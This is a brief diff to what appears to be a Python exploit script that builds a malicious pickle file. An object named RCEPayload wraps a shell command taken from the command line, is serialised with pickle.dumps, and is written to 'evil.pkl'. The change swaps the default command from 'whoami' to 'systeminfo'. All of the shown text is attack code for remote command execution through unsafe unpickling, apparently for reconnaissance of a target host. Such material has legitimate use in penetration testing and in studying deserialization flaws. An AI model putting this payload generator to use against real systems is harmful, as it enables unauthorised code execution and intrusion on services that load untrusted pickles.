@@ -39,7 +39,7 @@ class RCEPayload:
 
 
 if __name__ == "__main__":
-    cmd = sys.argv[1] if len(sys.argv) > 1 else "whoami"
+    cmd = sys.argv[1] if len(sys.argv) > 1 else "systeminfo"
     payload = pickle.dumps(RCEPayload(cmd))
 
     with open("evil.pkl", "wb") as f:
